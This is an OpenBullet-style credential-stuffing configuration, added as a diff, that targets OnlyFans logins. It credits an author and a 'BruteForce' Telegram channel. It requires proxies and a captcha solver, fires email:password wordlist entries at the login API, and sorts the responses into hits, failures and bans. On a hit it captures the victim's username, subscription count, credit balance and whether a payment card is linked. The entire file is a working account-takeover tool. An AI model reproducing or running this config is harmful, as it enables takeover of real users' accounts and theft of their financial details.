@@ -1,0 +1,135 @@
+[SETTINGS]
+{
+  "Name": "OnlyFans",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-22T14:15:54.3221642+03:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | Needs Captcha Solver | Capture | CPM Rate: 20-200",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+var ref = "";
+    var possible = "1234567890";
+    for( var i=0; i < 9; i++ )
+        ref += possible.charAt(Math.floor(Math.random() * possible.length));
+END SCRIPT -> VARS "ref"
+
+#G1 REQUEST GET "https://onlyfans.com/?ref=<ref>/" 
+  
+  HEADER "Host: onlyfans.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 7.0; HTC One A9 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.116 Mobile Safari/537.36" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "X-Requested-With: only.fans" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7" 
+
+#G2 REQUEST GET "https://onlyfans.com/api2/v2/init?app-token=33d57ade8c02dbc5a333db99ff9ae26a" 
+  
+  HEADER "Host: onlyfans.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 7.0; HTC One A9 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.116 Mobile Safari/537.36" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "X-Requested-With: only.fans" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Referer: https://onlyfans.com/?ref=<ref>/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7" 
+
+#K1 KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" EqualTo "400" 
+
+RECAPTCHA "https://onlyfans.com/api2/v2/init?app-token=33d57ade8c02dbc5a333db99ff9ae26a" "6LfVUxkUAAAAAFwy-qwWGqKNhT1vqmYF-9ULPAWz" -> VAR "g-recaptcha-response" 
+
+#P1 REQUEST POST "https://onlyfans.com/api2/v2/users/login?app-token=33d57ade8c02dbc5a333db99ff9ae26a" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"v3-recaptcha-response\":\"\",\"g-recaptcha-response\":\"<g-recaptcha-response>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: onlyfans.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 635" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Origin: https://onlyfans.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 7.0; HTC One A9 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.116 Mobile Safari/537.36" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "X-Requested-With: only.fans" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Referer: https://onlyfans.com/?ref=<ref>/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7" 
+
+#K2 KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "\"Wrong email or password\"" 
+    KEY "Email is not valid" 
+  KEYCHAIN Success OR 
+    KEY "{\"accessToken\":\"" 
+    KEY "\"userId\"" 
+  KEYCHAIN Ban OR 
+    KEY "\"Access denied.\"" 
+    KEY "\"Captcha wrong\"" 
+
+#TK PARSE "<SOURCE>" LR "accessToken\":\"" "\"" -> VAR "accessToken" 
+
+#G3 REQUEST GET "https://onlyfans.com/api2/v2/users/me?app-token=33d57ade8c02dbc5a333db99ff9ae26a" 
+  
+  HEADER "Host: onlyfans.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 7.0; HTC One A9 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.116 Mobile Safari/537.36" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "X-Requested-With: only.fans" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Referer: https://onlyfans.com/my/payments" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7" 
+
+#K3 KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "400" 
+
+#Uname PARSE "<SOURCE>" LR "username\":\"" "\"" CreateEmpty=FALSE -> CAP "Username" 
+
+#SubC PARSE "<SOURCE>" LR "subscribesCount\":" "," CreateEmpty=FALSE -> CAP "subscribesCount" 
+
+#Balance PARSE "<SOURCE>" LR "creditBalance\":" "," CreateEmpty=FALSE -> CAP "creditBalance" 
+
+#CardC PARSE "<SOURCE>" LR "isPaymentCardConnected\":" "," CreateEmpty=FALSE -> CAP "isPaymentCardConnected" 
+
+#K4 KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<isPaymentCardConnected>" Contains "False" 
+
